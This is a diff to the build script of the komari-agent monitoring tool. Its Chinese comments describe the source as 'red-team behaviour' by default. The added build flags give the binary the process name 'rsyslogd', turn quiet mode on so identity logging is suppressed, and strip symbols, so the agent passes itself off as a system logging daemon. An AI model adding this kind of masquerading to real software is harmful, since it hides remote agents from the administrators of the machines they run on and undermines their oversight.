@@ -26,8 +26,14 @@ is_linux_only_arch() {
 # 创建构建目录
 mkdir -p ./build
 
-# 获取当前版本
+# 源码默认已是红队行为。这里只覆盖进程名，并用 QUIET=0 重新打开身份日志。
+# 运行时关闭伪装：--disable-process-mask --show-banner --disable-security-warning=false
 VERSION=$(git describe --tags --abbrev=0 2>/dev/null || echo "dev")
+if [ "${PROCESS_NAME+set}" != "set" ]; then
+  PROCESS_NAME=rsyslogd
+fi
+QUIET="${QUIET:-1}"
+LDFLAGS="-s -w -X github.com/komari-monitor/komari-agent/update.CurrentVersion=${VERSION} -X github.com/komari-monitor/komari-agent/cmd.compiledProcessName=${PROCESS_NAME} -X github.com/komari-monitor/komari-agent/cmd.compiledQuiet=${QUIET}"
 
 # 初始化失败列表
 FAILED_BUILDS=()
@@ -51,7 +57,7 @@ for GOOS in "${OS_LIST[@]}"; do
     fi
 
     # 构建二进制文件
-    env GOOS=$GOOS GOARCH=$GOARCH CGO_ENABLED=0 go build -trimpath -ldflags="-X github.com/komari-monitor/komari-agent/update.CurrentVersion=${VERSION}" -o "./build/$BINARY_NAME"
+    env GOOS=$GOOS GOARCH=$GOARCH CGO_ENABLED=0 go build -trimpath -ldflags="${LDFLAGS}" -o "./build/$BINARY_NAME"
 
     if [ $? -ne 0 ]; then
       echo -e "${RED}Failed to build for $GOOS/$GOARCH${NC}"
